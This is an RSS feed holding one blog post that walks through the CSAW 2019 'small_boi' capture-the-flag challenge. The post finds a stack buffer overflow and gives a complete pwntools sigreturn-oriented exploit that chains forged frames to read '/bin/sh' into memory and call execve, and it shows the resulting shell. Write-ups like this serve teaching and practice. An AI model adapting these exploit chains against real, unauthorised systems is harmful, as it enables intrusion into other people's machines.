<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>sigrop on Anvbis</title><link>https://anvbis.github.io/tags/sigrop/</link><description>Recent content in sigrop on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><lastBuildDate>Sun, 15 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/tags/sigrop/index.xml" rel="self" type="application/rss+xml"/><item><title>CSAW 2019 :: Smallboi</title><link>https://anvbis.github.io/posts/csaw-2019-smallboi/</link><pubDate>Sun, 15 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/csaw-2019-smallboi/</guid><description>Reverse Engineering Like usual, we&amp;rsquo;ll start by running file to get a brief overflow of the executable&amp;rsquo;s architecture. Note that it is a 64-bit linux executable.
$ ./small_boi ./small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped Running checksec reveals that the only exploit protection in place is that the NX bit is enabled. Meaning we won&amp;rsquo;t be able to execute any shellcode on the stack.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>Like usual, we&amp;rsquo;ll start by running &lt;code>file&lt;/code> to get a brief overflow of the executable&amp;rsquo;s architecture. Note that it is a 64-bit linux executable.&lt;/p>
&lt;pre>&lt;code>$ ./small_boi
./small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped
&lt;/code>&lt;/pre>&lt;p>Running &lt;code>checksec&lt;/code> reveals that the only exploit protection in place is that the NX bit is enabled. Meaning we won&amp;rsquo;t be able to execute any shellcode on the stack.&lt;/p>
&lt;pre>&lt;code>$ checksec ./small_boi
[*] './small_boi'
Arch: amd64-64-little
RELRO: No RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;p>Running the executable reveals that it, at some point, takes user input. We&amp;rsquo;ll need to investigate this further to determine whether there is a vulnerability present.&lt;/p>
&lt;pre>&lt;code>$ ./small_boi
asdfsadf
&lt;/code>&lt;/pre>&lt;p>Viewing the disassembly of the entrypoint reveals that it calls some unknown function before it makes an &lt;code>exit&lt;/code> syscall.&lt;/p>
&lt;pre>&lt;code>entry0 ();
0x004001ad push rbp
0x004001ae mov rbp, rsp
0x004001b1 mov eax, 0
0x004001b6 call fcn.0040018c
0x004001bb xor rax, rdi
0x004001be mov rax, 0x3c ; '&amp;lt;' ; 60
0x004001c5 syscall ; exit(...)
0x004001c7 nop
0x004001c8 pop rbp
0x004001c9 ret
&lt;/code>&lt;/pre>&lt;p>Disassembling the function called within the entrypoint reveals a likely buffer overflow vulnerability.&lt;/p>
&lt;p>We can see that the function reads 512 bytes of data in from &lt;code>stdin&lt;/code> and stores it at a location only 32 bytes below the base of the function&amp;rsquo;s stack frame.&lt;/p>
&lt;pre>&lt;code>fcn.0040018c ();
; var int64_t var_20h @ rbp-0x20
0x0040018c push rbp
0x0040018d mov rbp, rsp
0x00400190 lea rax, [var_20h] ; rax = *var_20h
0x00400194 mov rsi, rax ; rsi = rax = *var_20h
0x00400197 xor rax, rax ; rax = 0
0x0040019a xor rdi, rdi ; rdi = 0
0x0040019d mov rdx, 0x200 ; rdx = 512
0x004001a4 syscall ; read(stdin, *var_20h, 512)
0x004001a6 mov eax, 0
0x004001ab pop rbp
0x004001ac ret
&lt;/code>&lt;/pre>&lt;p>Looking at the disassembly for the &lt;code>.text&lt;/code> section, we can see a sigreturn syscall. We can use this to execute any arbitrary syscall with a forged sigreturn frame.&lt;/p>
&lt;pre>&lt;code>;-- section..text:
0x0040017c push rbp ; [02] -r-x section size 78 named .text
0x0040017d mov rbp, rsp
0x00400180 mov eax, 0xf ; 15
0x00400185 syscall ; rt_sigreturn(...)
0x00400187 nop
0x00400188 pop rbp
0x00400189 ret
&lt;/code>&lt;/pre>&lt;p>We also discover a &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> string stored in the &lt;code>.rodata&lt;/code> section. This could be very useful - however, I&amp;rsquo;m going to avoid using it.&lt;/p>
&lt;p>I believe there should be another solution (albeit a more complex solution) that allows us to avoid using this string. I&amp;rsquo;ve arbitrarily decided that it feels a little like cheating.&lt;/p>
&lt;pre>&lt;code>;-- str.bin_sh:
;-- section..rodata:
0x004001ca .string &amp;quot;/bin/sh&amp;quot; ; len=8 ; [03] -r-- section size 8 named .rodata
&lt;/code>&lt;/pre>&lt;p>For our alternative solution, we need to find a section within the binary that we have write permissions for.&lt;/p>
&lt;p>Using &lt;code>readelf&lt;/code>, we can see that we have write permissions for the &lt;code>.data&lt;/code> section, stored at &lt;code>0x601000&lt;/code>. We&amp;rsquo;ll use this location to write a &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> string, and pivot our stack.&lt;/p>
&lt;pre>&lt;code>$ readelf --sections ./small_boi
There are 9 section headers, starting at offset 0x1090:
Section Headers:
[Nr] Name Type Address Offset
Size EntSize Flags Link Info Align
[ 0] NULL 0000000000000000 00000000
0000000000000000 0000000000000000 0 0 0
[ 1] .note.gnu.bu[...] NOTE 0000000000400158 00000158
0000000000000024 0000000000000000 A 0 0 4
[ 2] .text PROGBITS 000000000040017c 0000017c
000000000000004e 0000000000000000 AX 0 0 1
[ 3] .rodata PROGBITS 00000000004001ca 000001ca
0000000000000008 0000000000000000 A 0 0 1
[ 4] .eh_frame_hdr PROGBITS 00000000004001d4 000001d4
0000000000000024 0000000000000000 A 0 0 4
[ 5] .eh_frame PROGBITS 00000000004001f8 000001f8
0000000000000078 0000000000000000 A 0 0 8
[ 6] .data PROGBITS 0000000000601000 00001000
0000000000000010 0000000000000000 WA 0 0 8
[ 7] .comment PROGBITS 0000000000000000 00001010
000000000000002a 0000000000000001 MS 0 0 1
[ 8] .shstrtab STRTAB 0000000000000000 0000103a
0000000000000053 0000000000000000 0 0 1
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>Let&amp;rsquo;s do a little more information gathering before we write our exploit. We just need to find the offset of the return address from the start of the input buffer.&lt;/p>
&lt;p>Here&amp;rsquo;s a quick script that&amp;rsquo;ll send a cyclic pattern of bytes to the input that we can use to find the offset of the return address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./small_boi&amp;#39;&lt;/span>)
gdb&lt;span style="color:#f92672">.&lt;/span>attach(r)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(cyclic(&lt;span style="color:#ae81ff">512&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Continuing in GDB, and letting the executable crash, reveals the data that overwrote the value of the return address.&lt;/p>
&lt;pre>&lt;code> â–º 0x4001ac ret &amp;lt;0x6161616161616166&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Using pwntools' &lt;code>cyclic_find&lt;/code> function, and using the value above, we can find the offset of the return address from the start of our input buffer.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">In [&lt;span style="color:#ae81ff">2&lt;/span>]: cyclic_find(&lt;span style="color:#ae81ff">0x6161616161616166&lt;/span>, n&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)
Out[&lt;span style="color:#ae81ff">2&lt;/span>]: &lt;span style="color:#ae81ff">40&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>We can chain sigreturn instructions to perform a &lt;code>read&lt;/code> syscall and store &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> in memory, before making another sigreturn call to execute &lt;code>execve&lt;/code> with our &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> string.&lt;/p>
&lt;p>We just need to make sure that our first forged sigreturn frame maintains &lt;code>$rip&lt;/code> and pivots the stack to &lt;code>.data&lt;/code>, where we can continue execution.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>clear(arch&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>)
pad &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>
&lt;span style="color:#75715e"># address of sigreturn syscall&lt;/span>
sigret &lt;span style="color:#f92672">=&lt;/span> p64(&lt;span style="color:#ae81ff">0x00400180&lt;/span>)
&lt;span style="color:#75715e"># address of &amp;#34;/bin/sh&amp;#34; string &lt;/span>
bin_sh &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x004001ca&lt;/span>
&lt;span style="color:#75715e"># address of syscall instruction&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">syscall; nop; pop rbp; ret
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
syscall &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0400185&lt;/span>
&lt;span style="color:#75715e"># address of data section&lt;/span>
data &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x00601000&lt;/span>
read_frame &lt;span style="color:#f92672">=&lt;/span> SigreturnFrame()
read_frame&lt;span style="color:#f92672">.&lt;/span>rax &lt;span style="color:#f92672">=&lt;/span> constants&lt;span style="color:#f92672">.&lt;/span>SYS_read
read_frame&lt;span style="color:#f92672">.&lt;/span>rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
read_frame&lt;span style="color:#f92672">.&lt;/span>rsi &lt;span style="color:#f92672">=&lt;/span> data
read_frame&lt;span style="color:#f92672">.&lt;/span>rdx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>
read_frame&lt;span style="color:#f92672">.&lt;/span>rip &lt;span style="color:#f92672">=&lt;/span> syscall
read_frame&lt;span style="color:#f92672">.&lt;/span>rsp &lt;span style="color:#f92672">=&lt;/span> data &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
read_frame &lt;span style="color:#f92672">=&lt;/span> bytes(read_frame)
execve_frame &lt;span style="color:#f92672">=&lt;/span> SigreturnFrame()
execve_frame&lt;span style="color:#f92672">.&lt;/span>rax &lt;span style="color:#f92672">=&lt;/span> constants&lt;span style="color:#f92672">.&lt;/span>SYS_execve
execve_frame&lt;span style="color:#f92672">.&lt;/span>rdi &lt;span style="color:#f92672">=&lt;/span> data
execve_frame&lt;span style="color:#f92672">.&lt;/span>rsi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
execve_frame&lt;span style="color:#f92672">.&lt;/span>rdx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
execve_frame&lt;span style="color:#f92672">.&lt;/span>rip &lt;span style="color:#f92672">=&lt;/span> syscall
execve_frame &lt;span style="color:#f92672">=&lt;/span> bytes(execve_frame)
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./small_boi&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(pad &lt;span style="color:#f92672">+&lt;/span> sigret &lt;span style="color:#f92672">+&lt;/span> read_frame)
r&lt;span style="color:#f92672">.&lt;/span>clean(&lt;span style="color:#ae81ff">1&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>writeline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/bin/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> sigret &lt;span style="color:#f92672">+&lt;/span> execve_frame)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action.&lt;/p>
&lt;pre>&lt;code>$ ./exploit.py
[+] Starting local process './small_boi': pid 2731
[*] Switching to interactive mode
$ cat flag.txt
csaw19{smallboi}
$
[*] Stopped process './small_boi' (pid 2731)
&lt;/code>&lt;/pre></content></item></channel></rss>